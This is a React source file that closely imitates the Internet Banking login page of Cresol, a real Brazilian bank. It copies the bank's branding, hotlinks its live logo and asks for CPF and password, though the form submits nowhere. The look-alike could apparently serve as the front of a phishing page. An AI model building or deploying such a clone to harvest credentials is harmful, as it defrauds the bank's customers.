
import React, { useState } from "react";
import { Eye, EyeOff } from "lucide-react";
import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";

const TABS = [
  { label: "Pessoa Física", value: "fisica" },
  { label: "Pessoa Jurídica", value: "juridica" },
  { label: "Gerenciador Financeiro", value: "financeiro" },
];

const Index = () => {
  const [tab, setTab] = useState("fisica");
  const [cpf, setCpf] = useState("");
  const [senha, setSenha] = useState("");
  const [showSenha, setShowSenha] = useState(false);
  const [saveCpf, setSaveCpf] = useState(false);

  return (
    <div className="min-h-screen flex bg-[#fff]">
      {/* Left: Formulário */}
      <div className="w-1/2 flex flex-col justify-center px-[7%] py-12">
        <div className="max-w-md w-full mx-auto">
          <img
            src="https://www.cresol.com.br/img/logo-green.svg"
            alt="Cresol"
            className="h-8 mb-8"
            style={{ filter: "brightness(0) saturate(100%) invert(16%) sepia(88%) saturate(453%) hue-rotate(112deg) brightness(93%) contrast(91%)" }}
          />
          <h1 className="text-2xl font-semibold text-[#145C36] mb-3">Bem-vindo</h1>
          <p className="text-[1rem] text-gray-600 mb-8">
            Acesse sua conta e realize suas transações de forma rápida e segura a qualquer hora.
          </p>
          {/* Tabs */}
          <div className="flex mb-2 space-x-8 border-b border-gray-200">
            {TABS.map((t, idx) => (
              <button
                key={t.value}
                className={`pb-2 text-base font-semibold transition-colors 
                  ${
                    tab === t.value
                      ? "text-[#145C36] border-b-4 border-orange-400"
                      : "text-gray-500 border-b-4 border-transparent hover:text-[#145C36]"
                  }`}
                onClick={() => setTab(t.value)}
              >
                {t.label}
              </button>
            ))}
          </div>
          {/* Login Form */}
          <form className="mt-6">
            {/* CPF */}
            <div className="mb-4">
              <label className="block text-sm text-gray-700 font-medium mb-1">CPF</label>
              <input
                type="text"
                className="w-full h-11 px-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-white"
                placeholder="CPF"
                value={cpf}
                onChange={(e) => setCpf(e.target.value)}
                autoComplete="username"
              />
            </div>
            {/* Senha */}
            <div className="mb-3 relative">
              <label className="block text-sm text-gray-700 font-medium mb-1">Senha de acesso</label>
              <input
                type={showSenha ? "text" : "password"}
                className="w-full h-11 px-3 pr-10 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-gray-100"
                placeholder="Senha"
                value={senha}
                onChange={(e) => setSenha(e.target.value)}
                autoComplete="current-password"
              />
              <button
                type="button"
                className="absolute right-3 top-[38px] transform -translate-y-1/2 text-gray-400 hover:text-[#145C36]"
                tabIndex={-1}
                onClick={() => setShowSenha((v) => !v)}
                aria-label={showSenha ? "Ocultar senha" : "Mostrar senha"}
              >
                {showSenha ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>

            {/* Salvar CPF */}
            <div className="flex items-center mb-6">
              <input
                id="saveCpf"
                type="checkbox"
                checked={saveCpf}
                onChange={() => setSaveCpf((v) => !v)}
                className="w-4 h-4 accent-[#145C36] border-gray-300 rounded focus:ring-[#145C36]"
              />
              <label htmlFor="saveCpf" className="ml-2 text-sm text-gray-700">
                Salvar CPF
              </label>
            </div>

            {/* Entrar */}
            <button
              type="submit"
              className="w-full h-11 rounded bg-orange-500 hover:bg-orange-600 transition font-bold text-white text-lg shadow"
              style={{
                background: "linear-gradient(90deg,#ffaa00,#ff7300 100%)"
              }}
            >
              Entrar
            </button>
          </form>

          {/* Primeiro acesso */}
          <div className="mt-10 border-t border-gray-100 pt-8">
            <h2 className="text-lg font-semibold mb-2 text-[#145C36]">Primeiro acesso</h2>
            <p className="text-sm text-gray-600">
              Primeiro acesso ao Internet Banking Cresol? <br />
              <a href="#" className="text-orange-500 underline hover:text-orange-600 transition">Clique aqui</a> para criar sua senha.
            </p>
          </div>
        </div>
      </div>
      {/* Right: Imagem da mulher */}
      <div className="w-1/2 hidden lg:flex items-center justify-center bg-[#f5f6f7] relative overflow-hidden">
        <img
          src={womanImage}
          alt="Mulher segurando celular"
          className="object-contain max-h-[90vh] w-auto"
          style={{
            minHeight: 0,
            minWidth: 0,
            maxWidth: "95%",
            filter: "drop-shadow(0 2px 40px rgba(0,0,0,0.13))",
          }}
        />
        <div className="absolute inset-0 pointer-events-none" />
      </div>
    </div>
  );
};

export default Index;
